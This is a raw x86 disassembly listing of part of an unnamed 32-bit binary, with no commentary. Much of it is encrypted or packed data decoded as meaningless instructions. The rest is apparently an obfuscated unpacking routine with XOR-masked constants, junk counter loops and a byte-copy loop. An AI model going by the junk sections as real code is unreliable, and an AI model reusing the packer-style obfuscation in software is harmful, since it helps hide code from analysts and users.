  4101a9:	jae    0x4101b2
  4101ab:	adc    DWORD PTR [eax+0x684867b9],edx
  4101b1:	and    esp,DWORD PTR [ebx+0x57]
  4101b4:	bound  edx,QWORD PTR [edx+0x33]
  4101b7:	adc    BYTE PTR [ebp+0x3f426de6],0x59
  4101be:	dec    ebp
  4101bf:	shl    DWORD PTR [edi+eiz*4-0xa],0xa2
  4101c4:	call   0x2358:0xf8383914
  4101cb:	(bad)  
  4101cc:	push   ds
  4101cd:	sub    eax,0x76ee44ed
  4101d2:	mov    DWORD PTR [eax-0x3704f7a4],edx
  4101d8:	push   edx
  4101d9:	addr16 xchg edx,eax
  4101db:	inc    eax
  4101dc:	adc    al,BYTE PTR [esp+ecx*2+0x52]
  4101e0:	or     BYTE PTR [ebp-0x7e334ea5],bh
  4101e6:	shl    DWORD PTR [edi],0x72
  4101e9:	xlat   BYTE PTR ds:[ebx]
  4101ea:	sub    DWORD PTR [edi+0x1cdfc538],ecx
  4101f0:	jnp    0x410252
  4101f2:	sbb    ebp,DWORD PTR [ecx+0x25]
  4101f5:	sub    al,0xf1
  4101f7:	nop
  4101f8:	or     ch,BYTE PTR [edx]
  4101fa:	lea    eax,[esi+eiz*4-0x4e]
  4101fe:	cwde   
  4101ff:	daa    
  410200:	mov    al,ds:0xd2d35823
  410205:	mov    al,0x37
  410207:	cmp    DWORD PTR [eax+0x4a],edx
  41020a:	fs fucomp st(3)
  41020d:	loop   0x4101f5
  41020f:	ret    0x50e7
  410212:	cmp    BYTE PTR [ecx],ch
  410214:	(bad)  
  410216:	sti    
  410217:	icebp  
  410218:	mov    edi,esi
  41021a:	bnd jmp 0x410282
  41021d:	(bad)  
  41021f:	sub    DWORD PTR [edi+0x26],ebp
  410222:	adc    al,0xed
  410224:	in     eax,0x7c
  410226:	mov    ah,0xe1
  410228:	(bad)  
  41022a:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41022b:	es jo  0x410244
  41022e:	retf   0x98f5
  410231:	ror    BYTE PTR [eax-0x276f3fc3],0x46
  410238:	add    eax,edi
  41023a:	test   al,0x65
  41023c:	push   0xcd4c00b7
  410241:	lods   eax,DWORD PTR ds:[esi]
  410242:	cmps   DWORD PTR ss:[esi],DWORD PTR es:[edi]
  410244:	aad    0x89
  410246:	adc    eax,0x5962f2c3
  41024b:	jp     0x41027b
  41024d:	(bad)  
  41024e:	(bad)  
  41024f:	cld    
  410250:	sbb    DWORD PTR [ebx+0x2bb53fc8],0x74
  410257:	rcr    BYTE PTR [edi-0x43eef662],0x15
  41025e:	lods   al,BYTE PTR ds:[esi]
  41025f:	lock es mov gs,edi
  410263:	out    dx,al
  410264:	adc    eax,0x75c9af1e
  410269:	add    edx,DWORD PTR [ebx+edx*1]
  41026c:	jnp    0x410221
  41026e:	sub    DWORD PTR [edi-0x389557d1],edx
  410274:	out    dx,eax
  410275:	xor    BYTE PTR [esi],dl
  410277:	xchg   esi,eax
  410278:	loop   0x4102eb
  41027a:	mov    ?,WORD PTR [ebp+0x739b70a1]
  410280:	xchg   BYTE PTR [esi+0x4c],cl
  410283:	rcl    DWORD PTR [edx+0x40],cl
  410286:	(bad)  
  410287:	jg     0x410287
  410289:	dec    esi
  41028a:	in     al,dx
  41028b:	ror    bl,0xb7
  41028e:	into   
  41028f:	mov    al,ds:0xd7a231e4
  410294:	pop    edx
  410295:	mov    esi,DWORD PTR [ebp-0x8]
  410298:	mov    DWORD PTR ds:0x4337eb,0x5b5
  4102a2:	xor    eax,edx
  4102a4:	xor    esi,edx
  4102a6:	add    eax,ecx
  4102a8:	sub    DWORD PTR ds:0x43370f,0x433803
  4102b2:	add    esi,ecx
  4102b4:	imul   eax,esi
  4102b7:	jmp    0x41034e
  4102bc:	mov    DWORD PTR ds:0x433713,0x12
  4102c6:	cmp    DWORD PTR ds:0x433713,0x0
  4102cd:	je     0x410313
  4102d3:	cmp    DWORD PTR ds:0x433713,0x7
  4102da:	jne    0x4102eb
  4102e0:	push   0x1099
  4102e5:	call   DWORD PTR ds:0x412038
  4102eb:	cmp    DWORD PTR ds:0x433713,0x8
  4102f2:	jne    0x410303
  4102f8:	mov    eax,ds:0x433713
  4102fd:	dec    eax
  4102fe:	mov    ds:0x433713,eax
  410303:	mov    eax,ds:0x433713
  410308:	dec    eax
  410309:	mov    ds:0x433713,eax
  41030e:	jmp    0x4102c6
  410313:	mov    eax,DWORD PTR [ebp+0xc]
  410316:	mov    eax,DWORD PTR [eax+0x78]
  410319:	mov    DWORD PTR [ebp+0xc],eax
  41031c:	mov    eax,DWORD PTR [ebp-0x4]
  41031f:	mov    esi,DWORD PTR [ebp-0x8]
  410322:	xor    eax,edx
  410324:	xor    esi,edx
  410326:	add    eax,ecx
  410328:	add    esi,ecx
  41032a:	imul   eax,esi
  41032d:	mov    esi,DWORD PTR [ebp+0xc]
  410330:	cmp    esi,eax
  410332:	mov    eax,DWORD PTR [ebp-0x4]
  410335:	je     0x40ffbc
  41033b:	xor    eax,edx
  41033d:	add    eax,ecx
  41033f:	mov    ecx,DWORD PTR [ebp+0xc]
  410342:	imul   eax,ecx
  410345:	add    eax,DWORD PTR [ebp+0x8]
  410348:	mov    DWORD PTR [ebp+0xc],eax
  41034b:	mov    eax,DWORD PTR [ebp+0xc]
  41034e:	pop    esi
  41034f:	leave  
  410350:	ret    0x8
  410353:	push   ebp
  410354:	mov    ebp,esp
  410356:	push   ecx
  410357:	and    DWORD PTR ds:0x43370f,0x0
  410361:	jmp    0x410371
  410366:	mov    eax,ds:0x43370f
  41036b:	inc    eax
  41036c:	mov    ds:0x43370f,eax
  410371:	cmp    DWORD PTR ds:0x43370f,0x11
  410378:	jae    0x4103b4
  41037e:	cmp    DWORD PTR ds:0x43370f,0x9
  410385:	jne    0x410391
  41038b:	call   DWORD PTR ds:0x41203c
  410391:	cmp    DWORD PTR ds:0x43370f,0x8
  410398:	jne    0x4103a9
  41039e:	mov    eax,ds:0x43370f
  4103a3:	inc    eax
  4103a4:	mov    ds:0x43370f,eax
  4103a9:	jmp    0x410366
  4103ae:	xor    DWORD PTR ds:0x43371f,edi
  4103b4:	push   ecx
  4103b5:	add    DWORD PTR ds:0x43377f,0x4337bf
  4103bf:	mov    eax,0xf89c8531
  4103c4:	or     edx,DWORD PTR ds:0x433767
  4103ca:	mov    DWORD PTR [ebp-0x8],eax
  4103cd:	jmp    0x41065e
  4103d2:	jne    0x4103d9
  4103d4:	dec    eax
  4103d5:	cs push 0xee457173
  4103db:	xchg   edx,eax
  4103dc:	or     DWORD PTR [ebp+0x5149518],esp
  4103e2:	and    eax,0xea7e7ebd
  4103e7:	jl     0x410467
  4103e9:	jle    0x4103f1
  4103eb:	or     DWORD PTR [esi+0x3fb15278],esp
  4103f1:	mov    DWORD PTR [edx],ebp
  4103f3:	dec    edx
  4103f4:	imul   eax,DWORD PTR [ebp-0x73],0x40
  4103f8:	and    esp,esp
  4103fa:	sub    eax,0xfc93a6d1
  410400:	jnp    0x4103f9
  410402:	push   edi
  410403:	dec    ecx
  410404:	enter  0x1c06,0x51
  410408:	lods   eax,DWORD PTR ds:[esi]
  410409:	out    0x8,al
  41040b:	push   eax
  41040c:	pop    esi
  41040d:	sbb    ecx,DWORD PTR ds:0x94c5901a
  410413:	gs clc 
  410415:	sub    bh,bl
  410417:	mov    bh,0xf7
  410419:	push   ss
  41041a:	out    0x52,al
  41041c:	dec    ecx
  41041d:	loopne 0x41041c
  41041f:	cmp    DWORD PTR [edx+0x31],esi
  410422:	sahf   
  410423:	or     BYTE PTR [ecx+0x69],0x99
  410427:	call   0x3840:0x67f88649
  41042e:	xor    edx,ecx
  410430:	sbb    al,0x4
  410432:	pop    ds
  410433:	bound  edi,QWORD PTR [esi-0x9]
  410436:	into   
  410437:	cmp    al,0xa8
  410439:	retf   0xbb7
  41043c:	enter  0x433b,0x73
  410440:	or     eax,DWORD PTR [esi-0x6e]
  410443:	lds    esp,FWORD PTR [ecx]
  410445:	sub    eax,DWORD PTR [eax-0x4e]
  410448:	jle    0x41040b
  41044a:	loopne 0x41045e
  41044c:	and    BYTE PTR [edi+0x899e9b6],dh
  410452:	sbb    BYTE PTR [edi],cl
  410454:	shl    DWORD PTR ds:0x883a7c6c,1
  41045a:	xor    eax,0x1318959d
  41045f:	inc    esi
  410460:	xchg   ebx,eax
  410461:	fisub  WORD PTR [eax-0x102a4689]
  410467:	xor    al,0xc5
  410469:	imul   edx,DWORD PTR [esi+0x63],0x30
  41046d:	sub    al,BYTE PTR [ebp+ecx*1+0x400644e3]
  410474:	repz mov cl,0x2c
  410477:	ds pop edx
  410479:	inc    edi
  41047a:	sbb    al,0x5e
  41047c:	fwait
  41047d:	cwde   
  41047e:	ffree  st(6)
  410480:	cld    
  410481:	jge    0x4104e8
  410483:	add    ecx,ebx
  410485:	mov    dl,0x87
  410487:	repnz inc eax
  410489:	sub    DWORD PTR [esi-0x4572206b],0xffffffd2
  410490:	sbb    edx,DWORD PTR [edx+0x65]
  410493:	(bad)  
  410494:	pop    ebp
  410495:	add    BYTE PTR [esi+0x1e769b8d],bh
  41049b:	pop    edi
  41049c:	out    dx,eax
  41049d:	sub    DWORD PTR [ebx+0x2a876bc8],ebx
  4104a3:	mov    ds:0x501f16c6,al
  4104a8:	and    dl,BYTE PTR [esi+eiz*2]
  4104ab:	sub    DWORD PTR [ecx+0x78ff3f7b],esp
  4104b1:	xlat   BYTE PTR ds:[bx]
  4104b3:	adc    eax,0xb33e305f
  4104b8:	inc    esp
  4104b9:	int    0x7f
  4104bb:	leave  
  4104bc:	jle    0x410474
  4104be:	scas   eax,DWORD PTR es:[edi]
  4104bf:	mov    ds:0xca1d9b88,eax
  4104c4:	or     al,0x93
  4104c6:	fsub   DWORD PTR ds:0xbef302f3
  4104cc:	fisubr WORD PTR [ecx-0x49]
  4104cf:	adc    dh,BYTE PTR [ebp+0x20]
  4104d2:	sbb    ch,BYTE PTR [ecx-0x3469861f]
  4104d8:	jge    0x410520
  4104da:	push   cs
  4104db:	dec    esp
  4104dc:	sbb    eax,0xd0b102a1
  4104e1:	test   BYTE PTR [edi-0xf873c1c],bh
  4104e7:	popf   
  4104e8:	fidivr WORD PTR [esi+ebx*2+0x36e3cfe7]
  4104ef:	scas   eax,DWORD PTR es:[edi]
  4104f0:	sbb    DWORD PTR [ebp-0x39],ebx
  4104f3:	into   
  4104f4:	mov    al,ds:0x855bc3a8
  4104f9:	rcl    DWORD PTR [esi],1
  4104fb:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4104fc:	sbb    bh,BYTE PTR [edx-0x494619b9]
  410502:	shr    BYTE PTR [esi],0x94
  410505:	push   0x19caa7df
  41050a:	mov    ecx,ebx
  41050c:	aaa    
  41050d:	push   cs
  41050e:	inc    ebx
  41050f:	aaa    
  410510:	lahf   
  410511:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  410512:	xor    eax,0xad481cb1
  410517:	xor    BYTE PTR [ebp-0x19],bh
  41051a:	pop    esp
  41051b:	jmp    0xfa0644ae
  410520:	fldenv [ecx]
  410522:	adc    DWORD PTR [ebx+0x11dabd24],ebx
  410528:	xchg   ebp,eax
  410529:	outs   dx,BYTE PTR fs:[esi]
  41052b:	mov    ah,0x43
  41052d:	test   edx,0xeb1263
  410533:	adc    edx,DWORD PTR [ebx]
  410535:	rol    BYTE PTR [ebx+0x3a],1
  410538:	sbb    ebx,ecx
  41053a:	inc    esp
  41053b:	enter  0x85d8,0x18
  41053f:	cmp    BYTE PTR [eax],al
  410541:	inc    esi
  410542:	jle    0x41052c
  410544:	add    eax,0x17748750
  410549:	popw   es
  41054b:	popa   
  41054c:	stc    
  41054d:	call   0xc332e323
  410552:	pop    esi
  410553:	imul   edi,DWORD PTR [eax+0x4e],0xdf9ed32c
  41055a:	jg     0x410562
  41055c:	xlat   BYTE PTR ds:[ebx]
  41055d:	jmp    0x41055a
  41055f:	xor    eax,0x55c6c675
  410564:	cmp    DWORD PTR [ecx],0xd3137737
  41056a:	mov    bl,0x5f
  41056c:	jb     0x41054d
  41056e:	sub    BYTE PTR [eax],0x2e
  410571:	jmp    0xfece:0x4fb6d585
  410578:	pop    edx
  410579:	rol    dh,cl
  41057b:	add    esi,DWORD PTR [ecx+ebp*8]
  41057e:	nop
  41057f:	repnz test DWORD PTR [ebx+0x141aec21],edx
  410586:	mov    dh,dl
  410588:	adc    edx,DWORD PTR [ecx]
  41058a:	in     eax,0x55
  41058c:	add    DWORD PTR [ebp+ebx*4+0x5c],eax
  410590:	outs   dx,BYTE PTR ds:[esi]
  410591:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  410592:	jo     0x4105d4
  410594:	sbb    dh,dl
  410596:	lods   eax,DWORD PTR ds:[esi]
  410597:	xchg   ebx,eax
  410598:	(bad)  
  410599:	(bad)  
  41059a:	add    esi,DWORD PTR [esp+esi*8+0x5aeef9aa]
  4105a1:	jge    0x4105a4
  4105a3:	retf   0xffbf
  4105a6:	or     bl,BYTE PTR [edi+0x4c0bb3b1]
  4105ac:	rcl    DWORD PTR [edi+eax*2],cl
  4105af:	or     bl,BYTE PTR [ebx-0x4dc8ff5a]
  4105b5:	sub    bh,BYTE PTR [esi-0x71ebcae8]
  4105bb:	sub    eax,DWORD PTR ds:0xbfe6eb3a
  4105c1:	mov    cl,0x25
  4105c3:	sub    DWORD PTR [edx+0x36a7f87f],esp
  4105c9:	mov    esp,0xc3286c28
  4105ce:	(bad)  
  4105cf:	sti    
  4105d0:	xor    BYTE PTR [edx+0x40c58ac4],ch
  4105d6:	call   0xf8d65cba
  4105db:	mov    bh,bh
  4105dd:	jne    0x410656
  4105df:	retf   0x1741
  4105e2:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4105e3:	cld    
  4105e4:	outs   dx,BYTE PTR ds:[esi]
  4105e5:	xchg   ebp,eax
  4105e6:	fwait
  4105e7:	xor    eax,0x973701f9
  4105ec:	fwait
  4105ed:	imul   ebp
  4105ef:	pop    edi
  4105f0:	jle    0x410666
  4105f2:	loope  0x4105cb
  4105f4:	xchg   esi,eax
  4105f5:	mov    ebp,0x2d610ddc
  4105fa:	push   edx
  4105fb:	jp     0x4105ae
  4105fd:	mov    ds:0x91ac0f11,al
  410602:	jl     0x4105cc
  410604:	clc    
  410605:	daa    
  410606:	test   edx,ebp
  410608:	fwait
  410609:	mov    BYTE PTR [ecx+0x2a23841d],bl
  41060f:	add    BYTE PTR [edx-0x313bef4e],cl
  410615:	mov    edx,0xe81e7edc
  41061a:	mov    ch,0x4b
  41061c:	js     0x4105be
  41061e:	retf   0xce91
  410621:	or     eax,0x1f6bea98
  410626:	cmp    ebp,ecx
  410628:	daa    
  410629:	rcl    DWORD PTR [edi+0x59],1
  41062c:	fnstsw WORD PTR [edx]
  41062e:	call   0x2e59:0x46a1962c
  410635:	pop    ebx
  410636:	add    edi,edi
  410638:	(bad)  
  410639:	xor    esp,DWORD PTR [edi-0x41]
  41063c:	fwait
  41063d:	cmp    DWORD PTR [esi+0x40],ebp
  410640:	jmp    0xeb85558e
  410645:	je     0x4105fd
  410647:	inc    ecx
  410648:	popf   
  410649:	mov    dh,0x18
  41064b:	sbb    esi,DWORD PTR [ecx]
  41064d:	cld    
  41064e:	xor    DWORD PTR [edx+0x77],edx
  410651:	nop
  410652:	inc    ebx
  410653:	jne    0x410683
  410655:	dec    eax
  410656:	imul   ebp,DWORD PTR [edi-0x35],0xffffff94
  41065a:	xchg   edx,eax
  41065b:	test   BYTE PTR [ebx-0x3ba38de],dh
  410661:	xor    al,BYTE PTR [ebp+0x2581f89c]
  410667:	adc    esi,DWORD PTR [edi]
  410669:	inc    ebx
  41066a:	add    BYTE PTR [eax],al
  41066c:	add    BYTE PTR [eax],al
  41066e:	add    BYTE PTR [ebx+0x43371315],cl
  410674:	add    BYTE PTR [edx-0x77],al
  410677:	adc    eax,0x433713
  41067c:	cmp    DWORD PTR ds:0x433713,0x22
  410683:	jne    0x410692
  410689:	push   DWORD PTR [ebp-0x20]
  41068c:	call   DWORD PTR ds:0x412040
  410692:	cmp    DWORD PTR ds:0x433713,0x12
  410699:	jb     0x41066f
  41069f:	xor    edx,edx
  4106a1:	or     edx,DWORD PTR ds:0x4337ef
  4106a7:	sbb    edx,DWORD PTR ds:0x43371b
  4106ad:	mov    DWORD PTR ds:0x4337ef,edx
  4106b3:	mov    edx,DWORD PTR [ebp-0x8]
  4106b6:	mov    DWORD PTR ds:0x433733,0x17
  4106c0:	cmp    DWORD PTR ds:0x433733,0x0
  4106c7:	je     0x410724
  4106cd:	cmp    DWORD PTR ds:0x433733,0xc
  4106d4:	jne    0x4106ee
  4106da:	push   0x4338fc
  4106df:	push   DWORD PTR [ebp-0x1c]
  4106e2:	push   DWORD PTR [ebp-0x18]
  4106e5:	push   DWORD PTR [ebp-0x1c]
  4106e8:	call   DWORD PTR ds:0x4121e8
  4106ee:	cmp    DWORD PTR ds:0x433733,0xd
  4106f5:	jne    0x410708
  4106fb:	mov    ecx,DWORD PTR ds:0x433733
  410701:	dec    ecx
  410702:	mov    DWORD PTR ds:0x433733,ecx
  410708:	mov    ecx,DWORD PTR ds:0x433733
  41070e:	dec    ecx
  41070f:	mov    DWORD PTR ds:0x433733,ecx
  410715:	jmp    0x4106c0
  41071a:	mov    DWORD PTR ds:0x4337f3,0x1fcc
  410724:	push   esi
  410725:	xor    DWORD PTR ds:0x4337b7,ebx
  41072b:	mov    ecx,0x7510854
  410730:	sbb    DWORD PTR ds:0x433717,ecx
  410736:	xor    edx,ecx
  410738:	mov    esi,0x32729b
  41073d:	adc    DWORD PTR ds:0x433727,0x4337ab
  410747:	push   edi
  410748:	mov    edi,DWORD PTR [ebp+0x10]
  41074b:	add    edx,esi
  41074d:	cmp    edi,edx
  41074f:	je     0x410a59
  410755:	mov    edx,DWORD PTR [ebp-0x8]
  410758:	mov    eax,DWORD PTR [ebp-0x4]
  41075b:	xor    eax,ecx
  41075d:	mov    edi,0xffcd8d65
  410762:	sub    edi,eax
  410764:	add    edi,DWORD PTR [ebp+0x10]
  410767:	xor    edx,ecx
  410769:	add    edx,esi
  41076b:	cmp    edx,edi
  41076d:	ja     0x410a54
  410773:	push   ebx
  410774:	jmp    0x41077e
  410779:	mov    esi,0x32729b
  41077e:	mov    eax,DWORD PTR [ebp-0x8]
  410781:	mov    edi,DWORD PTR [ebp-0x4]
  410784:	xor    edi,ecx
  410786:	add    edi,esi
  410788:	mov    esi,DWORD PTR [ebp+0x8]
  41078b:	imul   edi,edx
  41078e:	mov    ebx,DWORD PTR [ebp+0xc]
  410791:	xor    eax,ecx
  410793:	add    eax,edx
  410795:	mov    al,BYTE PTR [ebx+eax*1+0x32729b]
  41079c:	mov    BYTE PTR [edi+esi*1],al
  41079f:	mov    eax,DWORD PTR [ebp-0x4]
  4107a2:	xor    eax,ecx
  4107a4:	lea    edx,[edx+eax*1+0x32729b]
  4107ab:	mov    eax,DWORD PTR [ebp-0x4]
  4107ae:	xor    eax,ecx
  4107b0:	mov    esi,0xffcd8d65
  4107b5:	sub    esi,eax
  4107b7:	add    esi,DWORD PTR [ebp+0x10]
  4107ba:	cmp    edx,esi
  4107bc:	jbe    0x410779
  4107c2:	pop    ebx
  4107c3:	jmp    0x410a54
  4107c8:	out    dx,eax
  4107c9:	adc    al,0x6b
  4107cb:	adc    esi,DWORD PTR [ecx+0x71]
  4107ce:	ja     0x4107c0
  4107d0:	or     DWORD PTR [eax],0x28
  4107d3:	icebp  
  4107d4:	push   cs
  4107d5:	or     esp,DWORD PTR [eax+0x4a]
  4107d8:	xchg   ecx,eax
  4107d9:	mov    ebx,0x7cea7e7e
  4107de:	jle    0x41085e
  4107e0:	mov    ebp,0xa5c277e6
  4107e5:	mov    ebp,DWORD PTR [edx+0x77]
  4107e8:	xchg   esp,eax
  4107e9:	sub    al,0xe0
  4107eb:	xor    ah,BYTE PTR [edi-0x504690e4]
  4107f1:	scas   eax,DWORD PTR es:[edi]
  4107f2:	in     eax,0xec
  4107f4:	call   0x56aaad21
  4107f9:	test   eax,0x201c6782
  4107fe:	ds jmp 0x44ad:0xac628e9e
  410806:	mov    cl,0x47
  410808:	aas    
  410809:	pop    edx
  41080a:	je     0x410826
  41080c:	inc    ebp
  41080d:	repnz push es
  41080f:	rcl    BYTE PTR [esi-0x2f],0x77
  410813:	mov    edx,0x704af71f
  410818:	nop
  410819:	(bad)  
  41081a:	dec    esp
  41081b:	sub    al,0xe8
  41081d:	das    
  41081e:	add    edi,DWORD PTR [ebp-0x27]
  410821:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  410822:	ror    edi,0x80
  410825:	(bad)  
  410827:	stos   BYTE PTR es:[edi],al
  410828:	js     0x410810
  41082a:	les    ebp,FWORD PTR [ecx]
  41082c:	(bad)  
  41082d:	pop    ecx
  41082e:	sub    esp,ecx
  410830:	and    eax,0xdd02d791
  410835:	dec    ebp
  410836:	cli    
  410837:	shl    ebx,0x1b
  41083a:	push   ss
  41083b:	cmp    ecx,DWORD PTR [esi]
  41083d:	aam    0x2a
  41083f:	sbb    BYTE PTR [ebx+0x31],ah
  410842:	and    eax,0x746ccfb7
  410847:	adc    ebx,DWORD PTR [ecx+0x359a9498]
  41084d:	aad    0xeb
  41084f:	les    edx,FWORD PTR [edx]
  410851:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  410852:	pop    ebp
  410853:	mov    al,0x9a
  410855:	mov    ah,0x3b
  410857:	push   0x6f
  410859:	sub    cl,BYTE PTR [ecx+0x1c8d7568]
  41085f:	out    dx,al
  410860:	cmc    
  410861:	jo     0x4108d3
  410863:	jmp    0x410819
  410865:	inc    esp
  410866:	sbb    al,0x79
  410868:	mov    bh,0x69
  41086a:	popa   
  41086b:	and    DWORD PTR [ebp-0xceea656],eax
  410871:	sbb    DWORD PTR [ecx],0x13573ad1
  410877:	hlt    
  410878:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  410879:	xor    DWORD PTR ds:0x19b2486,0x26abe764
  410883:	jg     0x410858
  410885:	nop
  410886:	jae    0x4108c6
  410888:	sub    eax,0xe97cd38b
  41088d:	cld    
  41088e:	mov    cl,0x4b
  410890:	push   edx
  410891:	bound  esp,QWORD PTR [edx]
  410893:	dec    esp
  410894:	and    BYTE PTR [eax+0x21],al
  410897:	(bad)  
  410899:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41089a:	sbb    BYTE PTR [ebp+0x65d1263e],dl
  4108a0:	mov    ecx,0xf7efe7f2
  4108a5:	outs   dx,BYTE PTR ds:[esi]
  4108a6:	pop    ebp
  4108a7:	jnp    0x410872
  4108a9:	leave  
  4108aa:	mov    edx,DWORD PTR [ecx-0x5807ccf4]
  4108b0:	rep stos DWORD PTR es:[edi],eax
  4108b2:	(bad)  
  4108b3:	lock aaa 
  4108b5:	mov    ds:0x567f4d2a,eax
  4108ba:	sar    BYTE PTR [edx],cl
  4108bc:	and    bl,0xb
  4108bf:	shr    BYTE PTR [ebp+0x815184d],1
  4108c5:	retf   0x6a68
  4108c8:	lahf   
  4108c9:	or     al,0xd7
  4108cb:	sub    cl,BYTE PTR [edx]
  4108cd:	dec    edi
  4108ce:	mov    ecx,?
  4108d0:	push   cs
  4108d1:	adc    BYTE PTR [esi-0x7f204b2f],ch
  4108d7:	aad    0x47
  4108d9:	xlat   BYTE PTR ds:[ebx]
  4108da:	mov    eax,0xe381cd4
  4108df:	cmp    edi,edi
  4108e1:	in     al,0x22
  4108e3:	inc    edi
  4108e4:	push   esi
  4108e5:	push   cs
  4108e6:	xchg   edx,eax
  4108e7:	inc    esp
  4108e8:	mov    ch,0x71
  4108ea:	ret    0x75cf
  4108ed:	mov    DWORD PTR [eax+0x4197b4df],esi
  4108f3:	fcom   QWORD PTR [edx+0xd0f9690]
  4108f9:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4108fa:	fst    st(3)
  4108fc:	lods   eax,DWORD PTR ds:[esi]
  4108fd:	scas   al,BYTE PTR es:[edi]
  4108fe:	cmp    ah,BYTE PTR [ebx]
  410900:	stos   DWORD PTR es:[edi],eax
  410901:	push   0x527b41b
  410906:	test   DWORD PTR [ecx],edx
  410908:	xlat   BYTE PTR ds:[ebx]
  410909:	jne    0x41090d
  41090b:	data16 and al,0xb3
  41090e:	sub    al,0x4b
  410910:	out    dx,al
  410911:	push   edx
  410912:	xor    dh,bl
  410914:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  410915:	xlat   BYTE PTR ds:[ebx]
  410916:	imul   esi,DWORD PTR [ecx],0xbd213053
  41091c:	dec    ebp
  41091d:	into   
  41091e:	dec    ecx
  41091f:	popf   
  410920:	je     0x4108ca
  410922:	inc    edx
  410923:	sub    al,BYTE PTR [esi]
  410925:	xor    BYTE PTR [ecx],ah
  410927:	sbb    cl,ah
  410929:	cmp    ebp,DWORD PTR [ecx]
  41092b:	or     edi,edi
  41092d:	aas    
  41092e:	jmp    0x65af69ea
  410933:	adc    ah,dl
  410935:	fbld   TBYTE PTR [eax]
  410937:	stc    
  410938:	ret    
  410939:	mov    edi,0x636c4e31
  41093e:	push   edx
  41093f:	push   eax
  410940:	ds mov bl,0xba
  410943:	inc    ebp
  410944:	in     eax,0x87
  410946:	jbe    0x41094c
  410948:	ret    
  410949:	rcr    BYTE PTR [edx],0xbd
  41094c:	cli    
  41094d:	nop
  41094e:	and    BYTE PTR [ecx+0x384074d5],dh
  410954:	dec    edx
  410955:	adc    al,0xa
  410957:	xchg   ebx,eax
  410958:	pop    ebp
  410959:	fwait
  41095a:	add    BYTE PTR [edi+0x37],0x87
  41095e:	add    DWORD PTR [ecx],0x58a7d804
  410964:	fst    DWORD PTR [esi-0x66]
  410967:	std    
  410968:	and    bl,BYTE PTR [eax-0x43]
  41096b:	aas    
  41096c:	js     0x410985
  41096e:	addr16 mov esi,0x4e04189f
  410974:	mov    ebp,0xd30202d3
  410979:	xchg   edi,eax
  41097a:	cmp    ch,BYTE PTR [edx]
  41097c:	iret   
  41097d:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41097e:	cmp    al,0x95
  410980:	pop    es
  410981:	pop    ebp
  410982:	jp     0x4109f1
  410984:	jnp    0x4109e8
  410986:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  410987:	nop
  410988:	ss jne 0x4109e0
  41098b:	fwait
  41098c:	mov    eax,0xe9218147
  410991:	cmp    eax,DWORD PTR [ecx]
  410993:	sub    al,0x1a
  410995:	lods   eax,DWORD PTR ds:[esi]
  410996:	fisub  WORD PTR [esi+0x606f7b6c]
  41099c:	pusha  
  41099d:	in     eax,0xd1
  41099f:	cmp    edi,DWORD PTR [edi+0x5d2ea770]
  4109a5:	mov    ecx,DWORD PTR [ebp-0x4d]
  4109a8:	xor    eax,0x172a78ea
  4109ad:	call   0x9dd9:0x42d08960
  4109b4:	jae    0x4109b1
  4109b6:	cdq    
  4109b7:	mov    ds:0x616db767,al
  4109bc:	pushf  
  4109bd:	stc    
  4109be:	sbb    DWORD PTR [ecx+edi*2-0x80],esp
  4109c2:	test   BYTE PTR [ebx+0x67],bh
  4109c5:	int3   
  4109c6:	mov    edi,0x975ebd8
  4109cb:	rcl    BYTE PTR [edx],cl
  4109cd:	push   edi
  4109ce:	xchg   ebx,eax
  4109cf:	stc    
  4109d0:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4109d1:	int3   
  4109d2:	lock add ah,dh
  4109d5:	xchg   ebp,eax
  4109d6:	fst    QWORD PTR [ebx+0x5f]
  4109d9:	cmp    BYTE PTR [ebx-0x17],dh
  4109dc:	and    BYTE PTR [ecx],ah
  4109de:	(bad)
  4109e2:	adc    ah,ah
  4109e4:	adc    eax,0x288a92f2
  4109e9:	pop    es
  4109ea:	aas    
  4109eb:	addr16 push ebp
  4109ed:	jecxz  0x4109c9
  4109ef:	pop    edi
  4109f0:	cmp    DWORD PTR [ecx-0x493862c0],edx
  4109f6:	cs push 0xce033f18
  4109fc:	arpl   dx,dx
  4109fe:	or     eax,0xe1aa66b
  410a03:	xor    dl,bl
  410a05:	push   ss
  410a06:	ins    DWORD PTR es:[edi],dx
  410a07:	xchg   BYTE PTR [ecx-0x4db5e63a],ah
  410a0d:	cmp    eax,0x75ac7c7c
  410a12:	xor    dl,BYTE PTR [ebx+0x7c]
  410a15:	aam    0xa2
  410a17:	jl     0x410a31
  410a19:	sti    
  410a1a:	repnz shr DWORD PTR [esi+0x30c04c1f],1
  410a21:	inc    edx
  410a23:	dec    ebp
  410a24:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  410a25:	retf   0xd527
  410a28:	push   0x97fc7f9d
  410a2d:	out    dx,al
  410a2e:	inc    ebx
  410a2f:	std    
  410a30:	pop    esp
  410a31:	sbb    bh,BYTE PTR [edx+0x2861c685]
  410a37:	ins    DWORD PTR es:[edi],dx
  410a38:	imul   esi,DWORD PTR [edx+edi*8-0x4a],0x1e
  410a3d:	test   DWORD PTR [ebx+0x2c494df5],esi
  410a43:	mov    esi,0x543d316d
  410a48:	xchg   ecx,eax
  410a49:	aad    0xf6
  410a4b:	sub    al,0xe3
  410a4d:	jne    0x410a00
  410a4f:	rcl    DWORD PTR [edx],cl
  410a51:	leave  
  410a52:	repnz mov ds:0x9c8532b8,al
  410a58:	clc    
  410a59:	pop    edi
  410a5a:	pop    esi
  410a5b:	leave  
  410a5c:	ret    0xc
  410a5f:	push   ebp
  410a60:	mov    ebp,esp
  410a62:	mov    eax,DWORD PTR [ebp+0xc]
  410a65:	xor    edx,edx
  410a67:	mov    ecx,0x7264fca9
  410a6c:	div    ecx
